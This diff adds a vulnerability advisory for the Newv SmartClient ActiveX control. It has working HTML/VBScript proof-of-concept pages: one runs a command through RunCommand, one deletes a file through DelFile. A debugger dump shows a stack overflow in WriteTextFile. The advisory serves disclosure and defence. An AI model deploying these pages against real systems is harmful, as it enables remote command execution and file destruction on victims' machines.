@@ -1,0 +1,73 @@
+source: http://www.securityfocus.com/bid/45751/info
+
+The Newv SmartClient ActiveX control is prone to multiple insecure-method vulnerabilities and a stack-based buffer-overflow vulnerability.
+
+Successfully exploiting these issues allows remote attackers to create or overwrite arbitrary local files, to delete arbitrary files, and to execute arbitrary code. Failed exploit attempts will result in a denial-of-service condition.
+
+Newv SmartClient 1.1.0.0 is vulnerable; other versions may also be affected. 
+
+NewV: NewvCommon.ocx arbitrary command execution via the Runcommand attribute
+
+POC 1:
+
+<html> 
+<head> 
+<script language=&#039;vbscript&#039;> 
+arg1 = "calc.exe" 
+</script> 
+</head> 
+<object classid=&#039;clsid:0B68B7EB-02FF-4A41-BC14-3C303BB853F9&#039; id=&#039;target&#039; /> 
+</object> 
+<script language=&#039;vbscript&#039;> 
+target.RunCommand arg1 
+</script> 
+</html> 
+
+#####################################################################################
+
+NewvCommon.ocx ActiveX Insecure Method Vulnerability.
+
+POC 2:
+
+Function DelFile (
+  ByVal FilePath  As Variant 
+)  As String
+
+
+<html>
+<head>
+<script language=&#039;vbscript&#039;>
+arg1 = "c:\\test.txt"
+</script>
+</head>
+<object classid=&#039;clsid:0B68B7EB-02FF-4A41-BC14-3C303BB853F9&#039; id=&#039;target&#039; />
+</object>
+<script language=&#039;vbscript&#039;>
+target.DelFile arg1 
+</script>
+</html>
+
+########################################################################################
+
+NewvCommon.ocx ActiveX Stack-Based Buffer Overflow Vulnerability
+
+POC 2:
+
+Function WriteTextFile (
+  ByVal str  As Variant , 
+  ByVal FilePath  As Variant 
+)  As String
+
+
+0:000> g
+(d2c.f84): Unknown exception - code 0eedfade (first chance)
+(d2c.f84): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=41414141 edx=7c9232bc esi=00000000 edi=00000000
+eip=41414141 esp=0013d8c8 ebp=0013d8e8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+<Unloaded_na.dll>+0x41414140:
+41414141 ??              ???
+
+
